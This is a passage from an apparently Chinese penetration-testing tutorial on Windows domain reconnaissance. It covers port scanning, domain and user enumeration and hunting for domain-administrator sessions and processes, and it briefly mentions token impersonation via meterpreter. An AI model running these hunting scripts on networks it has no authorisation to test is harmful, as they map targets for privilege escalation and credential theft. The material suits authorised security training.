href="#5：使用Nishang的Invoke-PortScan模块" class="headerlink" title="5：使用Nishang的Invoke-PortScan模块"></a>5：使用Nishang的Invoke-PortScan模块</h3><p>Invoke-PortScan 是 Nishang 的端口扫描脚本，用于发现主机、解析主机名、端口扫描，是一个很实用的脚本。输入“Get-Help Invoke-PortScan -full”命令，即可查看帮助信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">具体的参数介绍如下。 </span><br><span class="line">StartAddress：扫描范围开始的地址。 </span><br><span class="line">EndAddress：扫描范围结束的地址。 </span><br><span class="line">ScanPort：进行端口扫描。 </span><br><span class="line">Port：指定扫描端口。默认扫描的端口有 21、22、23、53、69、71、80、98、110、139、</span><br><span class="line">111、389、443、445、1080、1433、2001、2049、3001、3128、5222、6667、6868、7777、</span><br><span class="line">7878、8080、1521、3306、3389、5801、5900、5555、5901。 </span><br><span class="line">TimeOut：设置超时时间。</span><br><span class="line">使用以下命令对本地局域网进行扫描，搜索存活主机并解析主机名：</span><br><span class="line">Invoke-PortScan -StartAddress 192.168.250.1 -EndAddress 192.168.250.255 -ResolveHost</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1658.png" alt="图片"></p><h3 id="6：端口Bannner信息"><a href="#6：端口Bannner信息" class="headerlink" title="6：端口Bannner信息"></a>6：端口Bannner信息</h3><p>如果发现了端口，但是不确定这个端口是什么服务，就可以利用一些nc来获取这个端口的banner信息，就好比这样 ：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1659.png" alt="图片"></p><h2 id="2-7-搜集域内基础信息"><a href="#2-7-搜集域内基础信息" class="headerlink" title="2.7 搜集域内基础信息"></a>2.7 搜集域内基础信息</h2><p>确定了当前内网拥有的域，并且所控制的主机在域里面，就可以进行域内相关信息的收集了。</p><p>因为这些查询命令本质上都是通过 LDAP 协议去域控制器上查询的，查询时候需要经过权限认证，只有域用户才有这个权限，所以本地用户是无法运行以下命令的（system 权限用户除外。在域里面，除了普通用户，所有机器都有一个机器用户，用户名为机器名加“$”。system 用户对应的就是域里面的机器用户，所以 system 权限用户是可以运行以下查询命令的）。</p><h3 id="1：查询域"><a href="#1：查询域" class="headerlink" title="1：查询域"></a>1：查询域</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1660.png" alt="图片"></p><p>这里有个坑，有时候查询出错6118错误，是因为 Computer Brower 服务的问题，把它手动启动。</p><h3 id="2：查询域内所有计算机"><a href="#2：查询域内所有计算机" class="headerlink" title="2：查询域内所有计算机"></a>2：查询域内所有计算机</h3><p>执行以下命令就可以查询得到主机名对主机角色进行初步判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain:HACKER[主机名]</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1661.png" alt="图片"></p><h3 id="3：查询域内所有用户组列表"><a href="#3：查询域内所有用户组列表" class="headerlink" title="3：查询域内所有用户组列表"></a>3：查询域内所有用户组列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1662.png" alt="图片"></p><h3 id="4：查询所有域成员计算机列表"><a href="#4：查询所有域成员计算机列表" class="headerlink" title="4：查询所有域成员计算机列表"></a>4：查询所有域成员计算机列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1663.png" alt="图片"></p><h3 id="5：获取域密码信息"><a href="#5：获取域密码信息" class="headerlink" title="5：获取域密码信息"></a>5：获取域密码信息</h3><p>获取域密码策略、密码长度、错误锁定等信息用这条命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1664.png" alt="图片"></p><h3 id="6：获取域信任信息"><a href="#6：获取域信任信息" class="headerlink" title="6：获取域信任信息"></a>6：获取域信任信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1665.png" alt="图片"></p><h2 id="2-8-查找域控制器"><a href="#2-8-查找域控制器" class="headerlink" title="2.8 查找域控制器"></a>2.8 查找域控制器</h2><h3 id="1：查看域控制器的机器名"><a href="#1：查看域控制器的机器名" class="headerlink" title="1：查看域控制器的机器名"></a>1：查看域控制器的机器名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /DCLIST:主机名[Hacker]</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1666.png" alt="图片"></p><h3 id="2：查看域控制器主机名"><a href="#2：查看域控制器主机名" class="headerlink" title="2：查看域控制器主机名"></a>2：查看域控制器主机名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nslookup -type=SRV _ldap._tcp</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1667.png" alt="图片"></p><h3 id="3：查看当前时间"><a href="#3：查看当前时间" class="headerlink" title="3：查看当前时间"></a>3：查看当前时间</h3><p>在通常情况下，时间服务器为主域控制器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1668.png" alt="图片"></p><h3 id="4：查看域控制器组"><a href="#4：查看域控制器组" class="headerlink" title="4：查看域控制器组"></a>4：查看域控制器组</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1669.png" alt="图片"></p><p>PS：在实际情况中，一个域内一般有两台或者两台以上的域控制器，因为一点主域控制器发生故障，备用域控制器就可以保证域内服务和验证工作正常运行。</p><p>执行以下命令查看主域控制器为DC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdom query pdc</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1670.png" alt="图片"></p><h2 id="2-9-获取域内的用户和管理员信息"><a href="#2-9-获取域内的用户和管理员信息" class="headerlink" title="2.9 获取域内的用户和管理员信息"></a>2.9 获取域内的用户和管理员信息</h2><h3 id="1：查询所有域用户列表"><a href="#1：查询所有域用户列表" class="headerlink" title="1：查询所有域用户列表"></a>1：查询所有域用户列表</h3><h4 id="1-1：向域控制器进行查询"><a href="#1-1：向域控制器进行查询" class="headerlink" title="1.1：向域控制器进行查询"></a>1.1：向域控制器进行查询</h4><p>执行以下命令，向域控制器DC查询，域内有5个用户，其中krbtgt用户不仅可以创建票据授权服务（TGS）的加密密钥，还可以实现多种域内权限持久化方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1671.png" alt="图片"></p><h4 id="1-2：获取域内用户的详细信息"><a href="#1-2：获取域内用户的详细信息" class="headerlink" title="1.2：获取域内用户的详细信息"></a>1.2：获取域内用户的详细信息</h4><p>执行下面的命令可以获取域内用户的详细信息：用户名、描述信息、SID、域名等等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get /all</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1672.png" alt="图片"></p><h4 id="1-3：查看存在的用户"><a href="#1-3：查看存在的用户" class="headerlink" title="1.3：查看存在的用户"></a>1.3：查看存在的用户</h4><p>执行以下命令会发现有五个用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery user</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1673.png" alt="图片"></p><p>关于 dsquery 命令还有如下：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1674.png" alt="图片"></p><h4 id="1-4：查询本地管理员组用户"><a href="#1-4：查询本地管理员组用户" class="headerlink" title="1.4：查询本地管理员组用户"></a>1.4：查询本地管理员组用户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1675.png" alt="图片"></p><p>默认 Domain Admins 组为域内机器的本地管理员用户。在真实环境中，为了方便管理，会有域用户被添加为域机器的本地管理员用户。</p><h3 id="2：查询域管理员用户组"><a href="#2：查询域管理员用户组" class="headerlink" title="2：查询域管理员用户组"></a>2：查询域管理员用户组</h3><h4 id="2-1：查询域管理员用户"><a href="#2-1：查询域管理员用户" class="headerlink" title="2.1：查询域管理员用户"></a>2.1：查询域管理员用户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1676.png" alt="图片"></p><h4 id="2-2：查询域管理员用户组"><a href="#2-2：查询域管理员用户组" class="headerlink" title="2.2：查询域管理员用户组"></a>2.2：查询域管理员用户组</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Enterprise Admins&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1677.png" alt="图片"></p><h2 id="2-10-定位域管理员"><a href="#2-10-定位域管理员" class="headerlink" title="2.10 定位域管理员"></a>2.10 定位域管理员</h2><h3 id="1：域管理员定位概述"><a href="#1：域管理员定位概述" class="headerlink" title="1：域管理员定位概述"></a>1：域管理员定位概述</h3><p>内网渗透测试与常规的渗透测试是截然不同的。内网渗透测试的需求是拿到内网中特定用户或特定机器的权限，进而获得特定资源，完成内网渗透测试任务。</p><p>内网渗透测试与常规的渗透测试是截然不同的。内网渗透测试的需求是拿到内网中特定用户或特定机器的权限，进而获得特定资源，完成内网渗透测试任务。在通常的网络环境里，内网中部署了大量的网络安全设备，如 IDS、IPS、日志审计、安全网关、反病毒软件等。所以，在域网络攻击测试场景中，如果渗透测试人员获取了域内的一个支点，为了实现对域网络的整体控制，渗透测试人员就需要获取域管理员权限。</p><p>在一个域中，当计算机加入域后，会默认给域管理员组赋予本地系统管理员的权限。也就是说，在计算机添加到域中，成为域的成员主机后，系统会自动将域管理员组添加到本地系统管理员组中。因此，域管理员组的成员均可访问本地计算机，而且具备完全控制权限。</p><p>渗透测试人员通常会通过搜集域内信息，追踪域内特权用户、域管理组用户的历史登录位置、当前登录位置等。定位域内管理员的常规渠道，一是日志，二是会话。日志是指本地机器的管理员日志，可以使用脚本或 wevtutil 导出查看。会话是指域内每个机器的登录会话，可以匿名查询，无须权限，可以使用 netsess.exe 或 PowerView 等工具查询。</p><h3 id="2：常用域管理员定位工具"><a href="#2：常用域管理员定位工具" class="headerlink" title="2：常用域管理员定位工具"></a>2：常用域管理员定位工具</h3><h4 id="2-1：psloggedon-exe"><a href="#2-1：psloggedon-exe" class="headerlink" title="2.1：psloggedon.exe"></a>2.1：psloggedon.exe</h4><p>使用psloggedon.exe，可以查看本地登录的用户和通过本地计算机或远程计算机资源登录的用户。如果指定的是用户名而不是计算机名，psloggedon.exe会搜索网上邻居中的计算机，并显示该用户当前是否登录。其原理就是通过检查注册表 HKEY_USERS 项的 key 值来查询谁登录过（需要调用NetSessionEnum API），但某些功能需要管理员权限才能使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用语法：</span><br><span class="line">-：显示支持的选项和用于输出值的单位。</span><br><span class="line">-l：仅显示本地登录，不显示本地和网络资源登录。</span><br><span class="line">-x：不显示登录时间。 </span><br><span class="line">\\computername：指定要列出登录信息的计算机的名称。 </span><br><span class="line">Username：指定用户名，在网络中搜索该用户登录的计算机。</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1678.png" alt="图片"></p><h4 id="2-2：PVEFindADUser-exe"><a href="#2-2：PVEFindADUser-exe" class="headerlink" title="2.2：PVEFindADUser.exe"></a>2.2：PVEFindADUser.exe</h4><p>PVEFindADUser.exe这款工具可用于查找活动目录用户登录的位置、枚举域用户，以及查找在特定计算机上登陆的用户，包括本地用户、通过RDP登陆的用户、用于运行服务和计划任务的用户。运行该工具的计算机需要配置 .NET Framework 2.0 环境，并且需要具有管理员权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用语法：</span><br><span class="line">pveFindADUser.exe &lt;参数&gt;</span><br><span class="line">-h：显示帮助。</span><br><span class="line">-u：检查是否有更新版本的实用程序。</span><br><span class="line">-current [&#x27;&#x27;username&#x27;&#x27;]：如果仅指定了-current 参数，将获取所有目标计算机上当前登录的所有用户。如果指定了用户名（DOMAIN\Username），则显示该用户登录的计算机。</span><br><span class="line">-last [&#x27;&#x27;username&#x27;&#x27;]：如果仅指定了-last 参数，将获取目标计算机上的最后一个登录用户。如果指定了用户名（DOMAIN\Username），则显示具有此用户账户作为上次登录的计算机。根据网络的策略，可能会隐藏最后一个登录用户名，且该工具可能无法得到该用户名。  -noping：阻止该工具在尝试获取用户登录信息之前对目标计算机执行 ping 命令。</span><br><span class="line">-target：可选参数，用于指定要查询的主机。如果未指定此参数，将查询当前域中的所有主机。如果指定此参数，则后跟一个由逗号分隔的主机名列表。</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1679.png" alt="图片"></p><h4 id="2-3：netview-exe"><a href="#2-3：netview-exe" class="headerlink" title="2.3：netview.exe"></a>2.3：netview.exe</h4><p>netview.exe 是一个枚举工具，使用 WinAPI 枚举系统，利用NetSessionEnum找寻登陆会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登陆的用户。同时，netview.exe 能够查询共享入口和有价值的用户。netview.exe的绝大部分功能不需要管理员权限就可以使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">使用语法：</span><br><span class="line">netview.exe &lt;参数&gt;</span><br><span class="line">-h：显示帮助菜单。</span><br><span class="line">-f filename.txt：指定从中提取主机列表的文件。 </span><br><span class="line">-e filename.txt：指定要排除的主机名文件。 </span><br><span class="line">-o filename.txt：将所有输出重定向到文件。</span><br><span class="line">-d domain：指定从中提取主机列表的域。如果没有指定，则使用当前域。 </span><br><span class="line">-g group：指定用户搜寻的组名。如果没有指定，则使用 Domain Admins。 </span><br><span class="line"> -c：检查对已找到共享的访问权限。</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1680.png" alt="图片"></p><h4 id="2-4：Nmap的NSE脚本"><a href="#2-4：Nmap的NSE脚本" class="headerlink" title="2.4：Nmap的NSE脚本"></a>2.4：Nmap的NSE脚本</h4><p>如果有域账户或者本地账户，就可以使用 Nmap 的 smb-enum-sessions.nse 引擎来获取远程机器的登录会话，并且不需要管理员权限。smb-enum-sessions.nse 的下载地址为：<a href="https://nmap.org/nsedoc/scripts/smb-enum-sessions.html%E3%80%82">https://nmap.org/nsedoc/scripts/smb-enum-sessions.html。</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smb-enum-domains.nse：对域控制器进行信息收集，可以获取主机信息、用户、密码策略可</span><br><span class="line">以使用的用户等。</span><br><span class="line">smb-enum-users.nse：在进行域渗透测试的时候，如果获取了域内某台主机的权限，但是权限有限，不能获取更多的域用户信息，就可以借助这个脚本对域控制器进行扫描。</span><br><span class="line">smb-enum-shares.nse：遍历远程主机的共享目录。 </span><br><span class="line">smb-enum-processes.nse：对主机的系统进程进行遍历。通过这些信息，可以知道目标主机上运行软件信息，选择合适的漏洞或者规避防火墙及杀毒软件。</span><br><span class="line">smb-enum-sessions.nse：获取域内主机的用户登录会话，查看当前是否有用户登录。</span><br><span class="line">smb-os-discovery.nse：收集目标主机的操作系统、计算机名、域名、全称域名、域林名称、NetBIOS 机器名、NetBIOS 域名、工作组、系统时间。</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1681.png" alt="图片"></p><h4 id="2-5：PowerView脚本"><a href="#2-5：PowerView脚本" class="headerlink" title="2.5：PowerView脚本"></a>2.5：PowerView脚本</h4><p>PowerView是一款powershell脚本，提供了辅助定位关键用户的功能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Invoke-StealthUserHunter ：只需要一次查询，就可以获取域内的所有用户。从user.HomeDirectories 中提取所有用户，并对每个服务器进行 Get-NetSessions 获取。因为不需要使用 Invoke-UserHunter 对每台机器进行操作，所以这个方法的隐蔽性相对较高，但涉及的机器面不一定完整。默认使用 Invoke-StealthUserHunter，如果找不到需要的信息，就接着使用 Invoke-UserHunter 方法。</span><br><span class="line"></span><br><span class="line">Invoke-UserHunter：找到域内特定的用户群。它接收用户名、用户列表或域组查询，并接收一个主机列表或查询可用的主机域名。它会使用 Get-NetSessions 和 Get-NetLoggedon（调用 NetSessionEnum 和 NetWkstaUserEnum API）扫描每个服务器，而且会比较结果，筛选出目标用户集。使用这个工具是不需要管理员权限的。在本地绕过执行该脚本。</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1682.png" alt="图片"></p><h4 id="2-6：Empire下的user-hunter模块"><a href="#2-6：Empire下的user-hunter模块" class="headerlink" title="2.6：Empire下的user_hunter模块"></a>2.6：Empire下的user_hunter模块</h4><p>在 Empire 下也存在类似 Invoke-UserHunter 的模块——user_hunter，这个模块就是用来查找域管理员登录的机器的。</p><p>使用 <code>usemodule situational_awareness/network/powerview/user_hunter</code> 模块可以清楚地看到哪个用户登录了哪台主机。在这里，显示域管理员曾经登录了机器名为 WIN7-64.shuteer.testlab、IP 地址为 192.168.31.251 的机器。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1683.png" alt="图片"></p><h2 id="2-11-查找域管理进程"><a href="#2-11-查找域管理进程" class="headerlink" title="2.11 查找域管理进程"></a>2.11 查找域管理进程</h2><p>一个典型的域权限提升过程通常围绕着收集明文凭据或者通过 Mimikatz 来获得提升的权限等方法，然后在其所获取管理员权限的系统中寻找域管理员登录进程，从而收集域管理员的凭据。</p><p>我们来看一种假设的情况：渗透测试人员在某个内网环境中获得了一个域普通用户的权限，首先通过各种方法获得当前服务器的本地管理员权限，然后分析当前服务器的用户登录列表及会话信息，找出有哪些用户登录了这台服务器上。如果渗透测试人员通过分析发现，可以获取权限的登录用户都不是域管理员账户，同时也没有域管理员组的用户登录这台服务器，那么他会选择另一个账户，继续寻找这个账户在内网哪个机器上具有管理权限，再枚举这台机器上的登录用户，并继续进行渗透测试，直至找到一个有效的路径可以获取到域管理员权限为止。在具有成千上万台计算机和用户的环境中，该过程可能需要几天甚至几周的时间。</p><h3 id="1：本机检查"><a href="#1：本机检查" class="headerlink" title="1：本机检查"></a>1：本机检查</h3><h4 id="1-1：获取域管理员列表"><a href="#1-1：获取域管理员列表" class="headerlink" title="1.1：获取域管理员列表"></a>1.1：获取域管理员列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure><p>当前有一个域管理员：administrator</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1684.png" alt="图片"></p><h4 id="1-2：列出本机所有进程及进程用户"><a href="#1-2：列出本机所有进程及进程用户" class="headerlink" title="1.2：列出本机所有进程及进程用户"></a>1.2：列出本机所有进程及进程用户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1685.png" alt="图片"></p><h4 id="1-3：寻找进程所有者为域管理员的进程"><a href="#1-3：寻找进程所有者为域管理员的进程" class="headerlink" title="1.3：寻找进程所有者为域管理员的进程"></a>1.3：寻找进程所有者为域管理员的进程</h4><p>通过以上操作可以看出，当前存在域管理员进程，这种方法只是有几率能查找到域管理员进程，在实际情况下往往并非如此。</p><h3 id="2：查询域控制器的域用户会话"><a href="#2：查询域控制器的域用户会话" class="headerlink" title="2：查询域控制器的域用户会话"></a>2：查询域控制器的域用户会话</h3><p>查询域控制器的域用户会话，其原理是：在域控制器中查询域用户会话列表，并将其与域管理员列表进行交叉引用，从而得到域管理员会话的系统列表。</p><h4 id="2-1：查询域控制器列表"><a href="#2-1：查询域控制器列表" class="headerlink" title="2.1：查询域控制器列表"></a>2.1：查询域控制器列表</h4><p>可以使用LDAP查询从Domain Controlles单元中收集的域控制器列表。也可以使用net命令查询域控制器列表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1686.png" alt="图片"></p><h4 id="2-2：收集域管理员列表"><a href="#2-2：收集域管理员列表" class="headerlink" title="2.2：收集域管理员列表"></a>2.2：收集域管理员列表</h4><p>可以使用LDAP进行查询。也可以使用net命令，从域管理员组中收集域管理员列表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1687.png" alt="图片"></p><h4 id="2-3：收集所有活动域的会话列表"><a href="#2-3：收集所有活动域的会话列表" class="headerlink" title="2.3：收集所有活动域的会话列表"></a>2.3：收集所有活动域的会话列表</h4><p>使用netsess.exe查询每个域控制器，收集所有活动域会话列表。netsess.exe它包含本地Windows函数netsessionenum。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsess.exe -h</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1688.png" alt="图片"></p><h4 id="2-4：交叉引用域管理员列表与活动会话列表"><a href="#2-4：交叉引用域管理员列表与活动会话列表" class="headerlink" title="2.4：交叉引用域管理员列表与活动会话列表"></a>2.4：交叉引用域管理员列表与活动会话列表</h4><p>对域管理员列表和活动会话列表进行交叉引用，可以确定哪些IP地址有活动域令牌。也可以通过下列脚本快速使用netsess.exe的Windows命令行。</p><p>将域控制器列表添加到dcs.txt中，将域管理员列表添加到admins.txt中，并与netsess.exe放在同一目录下，运行脚本会在当前目录下生成一个文本文件sessions.txt：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; sessions.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I %a</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1689.png" alt="图片"></p><h3 id="3：查询远程系统中运行的任务"><a href="#3：查询远程系统中运行的任务" class="headerlink" title="3：查询远程系统中运行的任务"></a>3：查询远程系统中运行的任务</h3><p>如果目标机器在域系统中是通过共享的本地管理员账户运行的，就可以使用下列脚本来查询系统中的域管理员任务。</p><p>首先，从Domain Admins组中收集域管理员列表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1690.png" alt="图片"></p><p>然后运行如下脚本，将目标域系统列表添加到ips.txt文件中，将收集的域管理员列表添加到names.txt文件中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR /F %i in (ips.txt) DO @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in (names.txt) DO @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1691.png" alt="图片"></p><h3 id="4：扫描远程系统的NetBIOS信息"><a href="#4：扫描远程系统的NetBIOS信息" class="headerlink" title="4：扫描远程系统的NetBIOS信息"></a>4：扫描远程系统的NetBIOS信息</h3><p>某些版本的Windows操作系统允许用户通过NetBIOS查询已登录用户，下面这个Windows命令行脚本就用于扫描远程系统活跃域中的管理会话。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</span><br></pre></td></tr></table></figure><p>同样，吧目标域系统列表添加到ips.txt文件中，将收集的域管理员列表添加到admins.txt文件中，同目录运行脚本：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1692.png" alt="图片"></p><h2 id="2-12-域管理员模拟方法简介"><a href="#2-12-域管理员模拟方法简介" class="headerlink" title="2.12 域管理员模拟方法简介"></a>2.12 域管理员模拟方法简介</h2><p>如果您已经有一个 meterpreter 会话，您可以使用 Incognito模拟域管理员，或添加一个新的域 管理员。通过尝试遍历系统中所有可用的授权令牌来随意添加新的管理员。</p><h2 id="2-13-利用PowerShell收集域信息"><a href="#2-13-利用PowerShell收集域信息" class="headerlink" title="2.13 利用PowerShell收集域信息"></a>2.13 利用PowerShell收集域信息</h2><p>PowerShell可以理解为增强版的”cmd.exe”，打开方式就是：运行-&gt;输入powershell：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1693.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1694.png" alt="图片"></p><p>如果想执行一个Powershell脚本，需要修改Powershell的默认权限为执行权限。PowerShell常用的执行权限有四种：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Restricted：默认设置，不允许执行任何脚本。</span><br><span class="line">Allsigned：只能运行经过证书验证的脚本。</span><br><span class="line">Unrestricted：权限最高，可以执行任意脚本。</span><br><span class="line">RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名。 </span><br></pre></td></tr></table></figure><p>在PowerShell中输入Get-ExecutionPolicy，可以查看权限：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1695.png" 